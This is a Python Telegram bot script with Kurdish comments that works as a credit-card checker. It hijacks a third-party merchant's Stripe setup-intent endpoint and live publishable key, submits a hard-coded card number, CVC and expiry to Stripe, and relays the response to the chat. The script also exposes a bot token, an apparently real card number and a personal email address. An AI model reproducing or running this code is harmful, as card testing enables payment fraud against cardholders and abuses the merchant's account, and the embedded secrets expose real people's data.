import telebot
import requests

BOT_TOKEN = '8072279299:AAH0SaBdoqFOIP-qukCCfvCD7LkqefKlu9Q'
bot = telebot.TeleBot(BOT_TOKEN)

@bot.message_handler(commands=['start'])
def start(message):
    bot.reply_to(message, "بەخێربێت! بۆ تاقیکردنەوە، send /test.")

@bot.message_handler(commands=['test'])
def test_credit_card(message):
    # ئەم کۆدە لە کاتی تاقیکردنەوەی کرێدیت کارد کار دەکات
    # لەلایەن تۆ، پێویستە ئەم کۆدە لەگەڵ بەرەوپێش بکرێتەوە
    # بۆ نمونە، تەنها ئەمجا هەیە
    response = requests.post(
        'https://cinemamastery.com/api/non_oauth/stripe_intents/setup_intents/create',
        headers={
            'Content-Type': 'application/json',
            'accept': 'application/json'
        },
        json={
            'page_id': 'ZCtvdkFwV0ZBb2J1ZEpEOUw2YlRrQT09LS1tOFh1YXFEMWZlVEp5MGhPRnFRb2JnPT0=--06eb28a5479ac90f95675383388a8be1ecb4e0bc',
            'stripe_publishable_key': 'pk_live_51IksXdLsdufqQtEPrF9bXcJSrESLkgnbnfldl87Y1B20yq8lVkogGvYx5jpEduPg2CDuQ1E15IQzaaIRExFp0xkL001gqjnUZQ',
            'stripe_account_id': 'acct_1IksXdLsdufqQtEP'
        }
    )

    response_json = response.json()
    seti_id = response_json.get('id')
    if not seti_id:
        bot.reply_to(message, "نەیتوانی seti_ ID بدەیتەوە.")
        return

    # ئێستا، ئەمجا، ئەو seti_ لەگەڵ کرێدیت کارد وەکوو
    # لە دوای اینە، ئەمەیە کە دەتوانیت لە کۆتاییدا ببینیت
    confirm_response = requests.post(
        f'https://api.stripe.com/v1/setup_intents/{seti_id}',
        headers={
            'Content-Type': 'application/x-www-form-urlencoded',
            'accept': 'application/json'
        },
        data={
            'payment_method_data[type]': 'card',
            'payment_method_data[billing_details][email]': 'Peshangkrisp9@gmail.com',
            'payment_method_data[card][number]': '4147098797621083',
            'payment_method_data[card][cvc]': '202',
            'payment_method_data[card][exp_month]': '10',
            'payment_method_data[card][exp_year]': '28'
        }
    )
    # ئەمجا، پەیامەکە لە کۆتاییدا دەبینیت
    full_response = confirm_response.text
    bot.send_message(message.chat.id, full_response)

# پەیوەندیدانی bot
bot.polling()
